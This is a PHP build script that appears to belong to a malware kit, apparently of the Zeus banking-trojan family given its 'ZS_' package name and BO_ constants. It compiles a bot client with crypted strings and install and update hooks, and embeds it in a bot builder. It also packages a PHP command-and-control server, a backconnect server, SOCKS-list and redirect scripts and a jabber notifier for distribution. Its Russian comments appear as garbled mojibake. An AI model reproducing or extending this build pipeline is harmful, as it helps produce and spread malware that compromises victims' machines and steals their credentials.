<?php error_reporting(E_ALL); set_time_limit(0);

require_once('tools.inc.php');
require_once('buildconfig.inc.php');
require_once('configsample.inc.php');
require_once('baseconfig.inc.php');
require_once('installdata.inc.php');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Р’С‹РІРѕРґ Р»РѕРіРѕС‚РёРїР° Рё РѕР±СЂР°Р±РѕС‚РєР° РєРѕРјР°РЅРґРЅРѕР№ СЃС‚СЂРѕРєРё.
///////////////////////////////////////////////////////////////////////////////////////////////////
{
  writeLn(str_repeat('=', 80)."\r\n".BO_NAME." package builder.\r\n".str_repeat('=', 80)."\r\n");
  if($_SERVER['argc'] > 3 && strcmp($_SERVER['argv'][1], '-b') === 0)
  {
    $configDir = $dir['configs'].'\\'.basename($_SERVER['argv'][2]);
    loadPackageConfig($configDir);
  }
  else
  {
    $helpMessage = "\t-b [config file] [signature] - build package.\r\n";
    writeLn("Commands:\r\n".$helpMessage);
    die(1);
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Р’С‹РІРѕРґ Р·Р°РіРѕР»РѕРІРєР° СЃР±РѕСЂРєРё.
///////////////////////////////////////////////////////////////////////////////////////////////////
define('BO_SIGNATURE', $_SERVER['argv'][3]);
writeLn("-> Configuration:  ".basename($configDir)."\n".
        "-> Debug:          ".$config['debug']."\n".
        "-> Version:        ".BO_CLIENT_VERSION."\n".
        "-> Signature:      ".BO_SIGNATURE);
if(getenv('BO_SLIENT') === FALSE)waitAnyKey();

///////////////////////////////////////////////////////////////////////////////////////////////////
// РќР°С‡Р°Р»Рѕ СЃР±РѕСЂРєРё.
///////////////////////////////////////////////////////////////////////////////////////////////////
require_once($dir['source']['common'].'\defines.php');

writeStep('CLEARING');
clearTemp(1);

writeStep('PREPARING');
writeFile($dir['output'][0].'\config', basename($configDir));
writeFile($dir['source']['common'].'\config.h', generateDefaultConfigHeader(
          "#define BO_SIGNATURE \"".BO_SIGNATURE."\"\r\n".
          "#define BO_SIGNATURE_HASH \"".sprintf("0x%08X", crc32(BO_SIGNATURE))."\"\r\n".
          "\r\n//List of common defines from defines.php\r\n".generateXDefines($_COMMON_DEFINE, 'c')));

if(configBool('buildtools_platforms'))
{
  writeStep("BUILDING BUILDTOOLS");
  buildBinary('buildtools', 1, true, false);
  copyFile($dir['output']['buildtools'].'\\'.$commandLineOptions['buildtools']['win64']['name'], $dir['bin'].'\\'.$commandLineOptions['buildtools']['win64']['name']);
}

if(configBool('client_platforms'))
{
  writeStep("BUILDING CLIENT");
  
  writeFile($dir['source']['common'].'\generateddata.h', headerOfHfile().
            generateBaseConfigHeader()."\r\n".
            generateInstallData()
           );

  generateCryptedStrings($dir['source']['client'].'\cryptedstrings');
  
  //РЎР±РѕСЂРєР°.
  buildBinary('client', 0, true, true);
  
  //РЎРѕР·РґР°РЅРёРµ РґР°РЅРЅС‹С… РґР»СЏ Р±РёР»РґРµСЂР°.
  $client32 = '';
  $client32 .= "#define CLIENT32_VA_BASECONFIG ".sprintf('0x%08X', getVaFromMap('client', 'win32', 'baseConfigSource'))."\r\n";
  $client32 .= "#define CLIENT32_VA_INSTALL    ".sprintf('0x%08X', getVaFromMap('client', 'win32', '_install'))."\r\n"; //CoreInstall.
  $client32 .= "#define CLIENT32_VA_UPDATE     ".sprintf('0x%08X', getVaFromMap('client', 'win32', '_update'))."\r\n"; //CoreInstall.
  $client32 .= "const BYTE _client32[] =\r\n".binFileToCArray($dir['output']['client'].'\\'.$commandLineOptions['client']['win32']['name'], 0);
  writeFile($dir['source']['builder'].'\clients.h', headerOfHfile().$client32."\r\n");
}

if(configBool('builder_platforms'))
{
  writeStep("BUILDING BUILDER");
  buildBinary('builder', 1, true, true);

  writeStep("BUILDING SAMPLE CONFIGURATION FILE");
  buildConfigSample($dir['output']['builder']);

  //РљРѕРїРёСЂСѓРµРј Р»РёС†РµРЅР·РёСЋ, РµСЃР»Рё РѕРЅР° СЃСѓС‰РµcС‚РІСѓРµС‚.
  copyFileIfExists("{$configDir}\\license.key", $dir['output']['builder'].'\license.key');
}

if(configBool('manual'))
{
  writeStep("BUILDING MANUAL");
  copyFile($dir['docs'].'\manual_ru.html', $dir['output'][0].'\manual_ru.html');
}

if(platformEnabled('server', 'php'))
{
  writeStep("BUILDING PHP SERVER");

  if(!configBool('jabber_notifier'))
  {
    $commandLineOptions['server']['php']['exclude_files'][] = 'system\jabberclass.php';
    $commandLineOptions['server']['php']['exclude_files'][] = 'system\reports_jn.*';
  }
  
  buildBinary('server', 0, false, false);
  
  //РљРѕРїРёСЂСѓРµРј РіРµРѕ-Р±Р°Р·Сѓ.
  copyFile($dir['geobase'].'\country[maxmind].txt', $dir['output']['server'].'[php]\install\geobase.txt');
  createSubDir($dir['source']['server'].'[php]\tmp');
  
  //РљРѕРїРёСЂСѓРµРј РґРѕРїРѕР»РЅРµРЅРёСЏ.
  createSubDir($dir['output']['other']);
  copyFile($dir['source']['other'].'\redir.php', $dir['output']['other'].'\redir.php');
  copyFile($dir['source']['other'].'\sockslist.php', $dir['output']['other'].'\sockslist.php');
}

if(configBool('bcserver_platforms'))
{
  writeStep("BUILDING BACKCONNECT SERVER");
  buildBinary('bcserver', 1, true, false);
}

if(configBool('builder_platforms') || configBool('bcserver_platforms') || platformEnabled('server', 'php'))
{
  writeStep("CREATING DISTRIBUTED PACKAGE");
  packDir(array(
                $dir['output']['builder'],
                $dir['output']['server'].'[php]',
                $dir['output']['server'],
                $dir['output']['other'],
                $dir['output'][0].'\manual_??.txt'
               ),
          $dir['output'][0].'\ZS_'.BO_CLIENT_VERSION);
}

goodEnd();
?>